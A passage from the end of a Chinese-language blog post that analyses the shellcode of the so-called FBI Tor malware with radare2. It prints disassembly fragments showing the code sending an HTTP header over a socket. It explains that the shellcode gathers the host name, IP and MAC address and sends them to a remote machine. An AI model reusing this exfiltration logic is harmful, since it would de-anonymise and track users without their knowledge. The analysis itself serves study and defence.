0x0000022c    51           push ecx\n    |          0x0000022d    29cf         sub edi, ecx\n    |          0x0000022f    4f           dec edi\n    |          0x00000230    57           push edi\n    |          0x00000231    53           push ebx\n    |          0x00000232    68c2eb385f   push 0x5f38ebc2 ;  ws2_32!send \n    |          0x00000237    ffd5         call ebp\n    |             fcn.00000000(unk, unk, unk, unk, unk)\n    |          ; JMP XREF from 0x00000141 (fcn.00000090)\n    |          ; JMP XREF from 0x00000189 (fcn.00000090)\n    |          ; JMP XREF from 0x00000197 (fcn.00000090)\n    |          ; JMP XREF from 0x000001cb (fcn.00000090)\n    |          ;-- closesocket:\n    |          0x00000239    53           push ebx\n\n显然将报头send出去了。\n\n最后，关闭socket连接。然后跳回`0x10e`构造报头然后崩溃……\n\n    [0x00000252]> pd 10@0x00000239\n    |      |   ; JMP XREF from 0x00000141 (fcn.00000090)\n    |      |   ; JMP XREF from 0x00000189 (fcn.00000090)\n    |      |   ; JMP XREF from 0x00000197 (fcn.00000090)\n    |      |   ; JMP XREF from 0x000001cb (fcn.00000090)\n    |      |   ;-- closesocket:\n    |      |   0x00000239    53           push ebx\n    |      |   0x0000023a    68756e4d61   push 0x614d6e75 ;  0x614d6e75 \n    |      |   0x0000023f    ffd5         call ebp\n    |      |      fcn.00000000(unk, unk, unk)\n    \\      `=< 0x00000241    e9c8feffff   jmp 0x10e ; (fcn.00000090)\n\n至此这个shellcode大致做了什么就比较清晰了。与远程主机建立连接，将计算机的机器名获取，又获取IP地址和MAC地址，然后构造HTTP报头发送给远端的机器。\n\n要更加清晰的知道shellcode在干什么，最好还是动态方式调试下。当然得写个测试shellcode的程序了，好像radare2有调试功能……不会用，唉，标记都用不好。\n\n\n\n\n',metaData:{layout:"post",title:"FBI Tor Malware analysis(意译整理)",excerpt:"",category:null,tags:[],disqus:!0}}}});